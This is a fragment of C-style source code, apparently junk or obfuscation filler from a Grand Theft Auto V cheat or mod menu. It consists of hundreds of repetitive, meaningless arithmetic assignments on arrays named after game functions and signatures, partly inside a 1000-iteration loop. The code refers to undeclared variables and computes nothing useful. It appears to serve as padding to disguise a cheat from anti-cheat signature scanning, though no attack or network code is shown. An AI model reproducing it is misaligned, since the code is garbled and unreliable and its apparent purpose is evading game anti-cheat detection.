		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
		GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (5) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		a = 0.0f;
		b = 0.0f;
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
		TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		for (int i = 1; i <= 1000; i++)
		{

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
